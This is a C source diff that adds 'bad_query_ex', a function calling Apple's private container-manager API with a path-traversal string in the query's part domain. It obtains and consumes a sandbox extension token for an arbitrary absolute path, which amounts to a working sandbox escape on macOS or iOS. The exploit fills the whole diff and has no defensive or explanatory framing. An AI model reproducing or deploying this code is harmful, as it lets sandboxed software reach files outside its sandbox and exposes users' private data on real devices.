@@ -138,6 +138,78 @@ int64_t bad_query(char* path, bool create, char *group_identifier, bool is_group
     return handle;
 }
 
+int64_t bad_query_ex(char* path, bool create, char *group_identifier, uint64_t container_class) {
+    if (!path || path[0] != '/') return -255;
+    if (!create) {
+        struct stat st;
+        if (lstat(path, &st) != 0) return -254;
+    }
+
+    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
+    if (!mgr) return -1;
+
+    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
+    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
+    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
+    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
+    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
+    container_query_set_part_domain_fn query_set_part_domain = (container_query_set_part_domain_fn)dlsym(mgr, "container_query_operation_set_part_domain");
+    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
+    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
+    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
+    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
+
+    int64_t handle = -1;
+    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_set_part_domain || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
+        dlclose(mgr);
+        return -1;
+    }
+
+    void *query = query_create();
+    if (!query) { dlclose(mgr); return -2; }
+
+    query_set_class(query, container_class);
+    xpc_object_t identifier = xpc_string_create(group_identifier);
+    query_set_group_identifiers(query, identifier);
+    query_set_part(query, 3);
+
+    // depth of traversal depends on container class path depth
+    char *part = NULL;
+    if (asprintf(&part, "../../../../../../../../..%s", path) == -1) {
+        xpc_release(identifier);
+        query_free(query);
+        dlclose(mgr);
+        return -5;
+    }
+    query_set_part_domain(query, part);
+    query_set_flags(query, 0x0000008000000000ULL);
+
+    void *result = query_get_single_result(query);
+    if (!result) {
+        free(part);
+        xpc_release(identifier);
+        query_free(query);
+        dlclose(mgr);
+        return -3;
+    }
+    char *token = copy_sandbox_token(result);
+    if (!token) {
+        free(part);
+        xpc_release(identifier);
+        query_free(query);
+        dlclose(mgr);
+        return -4;
+    }
+
+    handle = consume_extension(token);
+    free(token);
+    free(part);
+    xpc_release(identifier);
+    query_free(query);
+    dlclose(mgr);
+    return handle;
+}
+
 void bad_query_release(int64_t handle) {
     if (handle < 0) return;
     sandbox_extension_release_fn release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
